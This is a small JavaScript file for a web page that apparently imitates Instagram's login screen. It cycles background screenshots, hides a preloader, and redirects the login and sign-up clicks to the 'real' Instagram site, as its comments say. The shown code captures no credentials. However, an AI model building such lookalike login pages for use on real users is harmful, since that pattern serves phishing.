document.addEventListener("DOMContentLoaded", function() {
  // Array of image URLs
  var images = [
    "screenshot1.png",
    "screenshot2.png",
    "screenshot3.png",
    "screenshot4.png"
  ];

  var currentIndex = 0;
  var backgroundMobile = document.querySelector(".background_mobile");

  // Function to change the background image
  function changeBackgroundImage() {
    currentIndex = (currentIndex + 1) % images.length;
    backgroundMobile.style.backgroundImage = "url(" + images[currentIndex] + ")";
  }

  // Change background image every 3 seconds
  setInterval(changeBackgroundImage, 3000);
});




// This is to redirect user to real instagram login page when click on log in 
document.addEventListener("DOMContentLoaded", function() {
  // Get reference to the login button
  const loginButton = document.getElementById("Email2");

  // Add event listener to the login button
  loginButton.addEventListener("click", function() {
      // Redirect the user to the Instagram website
      window.location.href = "https://www.instagram.com";
  });
});


// This is to redirect user to real instagram sign up page when click on sign up
document.addEventListener("DOMContentLoaded", function() {
  // Get reference to the sign-up button
  const signUpButton = document.querySelector(".div_2 a");

  // Add event listener to the sign-up button
  signUpButton.addEventListener("click", function(event) {
      // Prevent the default action of the link (i.e., following the href)
      event.preventDefault();
      
      // Redirect the user to the sign-up page on Instagram
      window.location.href = "https://www.instagram.com/accounts/emailsignup/";
  });
});


window.addEventListener('load', function() {
  var preloader = document.querySelector('.preloader');
  var content = document.querySelector('.content');

  // Hide preloader
  preloader.style.display = 'none';

  // Show content
  content.style.display = 'block';
});